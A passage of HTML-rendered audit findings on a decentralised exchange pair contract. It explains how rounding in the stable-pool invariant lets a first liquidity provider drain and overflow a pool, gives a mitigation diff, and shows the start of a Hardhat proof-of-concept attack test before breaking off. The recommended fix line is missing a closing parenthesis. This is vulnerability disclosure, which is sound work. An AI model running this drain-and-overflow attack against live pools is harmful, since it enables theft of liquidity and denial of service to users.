class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edecimals1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    @\u0026gt;\u0026gt;     \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_a\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_x\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_y\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_b\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = ((\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_x\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_x\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_y\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_y\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_a\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_b\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// x3y+y3x \u0026gt;= k\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ex\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// xy \u0026gt;= k\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe value of \u003ccode\u003e_a = (x * y) / 1e18\u003c/code\u003e becomes zero due to rounding errors when \u003ccode\u003ex * y \u0026#x3C; 1e18\u003c/code\u003e. This rounding error can result in the invariant k of stable pools equaling zero, allowing a trader to steal the remaining assets in the pool. A malicious first liquidity provider can DOS the pair by:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eMinting a small amount of liquidity to the pool.\u003c/li\u003e\n\u003cli\u003eStealing the remaining assets in the pool.\u003c/li\u003e\n\u003cli\u003eRepeating steps 1 and 2 until the total supply overflows.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"impact-5\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-5\" aria-label=\"impact 5 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003ePool will be DOSsed for other users to use.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"30\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003efunction mint(address to) external lock returns (uint liquidity) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        (uint _reserve0, uint _reserve1) = (reserve0, reserve1);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint _balance0 = IERC20(token0).balanceOf(address(this));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint _balance1 = IERC20(token1).balanceOf(address(this));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint _amount0 = _balance0 - _reserve0;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint _amount1 = _balance1 - _reserve1;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        if (_totalSupply == 0) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            liquidity = Math.sqrt(_amount0 * _amount1) - MINIMUM_LIQUIDITY;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+           if (stable) { require(_k(_amount0, _amount1) \u0026gt; MINIMUM_K; }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        } else {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            liquidity = Math.min(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                (_amount0 * _totalSupply) / _reserve0,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                (_amount1 * _totalSupply) / _reserve1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        require(liquidity \u0026gt; 0, \u0026quot;ILM\u0026quot;); // Pair: INSUFFICIENT_LIQUIDITY_MINTED\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        _mint(to, liquidity);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        _update(_balance0, _balance1, _reserve0, _reserve1);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        emit Mint(msg.sender, _amount0, _amount1);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"proof-of-concept-4\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cdetails\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"31\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e } = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;chai\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e } = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;hardhat\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003edescribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Pair Vulnerability Test (First Liquidity Provider DOS)\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edai\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Added PairGenerator\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// To interact with the Pair contract instance\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMINT_AMOUNT\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBigNumber\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;10000000\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 10_000_000 wei (as in PoC)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eINITIAL_TOKEN_SUPPLY_FOR_ATTACKER\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseEther\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;10000\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 10,000 full tokens\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebeforeEach\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003easync\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        [\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetSigners\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Deploy Mock ERC20 tokens\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockERC20Factory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetContractFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;MockERC20\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edai\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockERC20Factory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeploy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Dai Stablecoin\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;DAI\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edai\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeployed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockERC20Factory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeploy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Frax Stablecoin\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;FRAX\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeployed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Mint tokens to attacker\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edai\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan 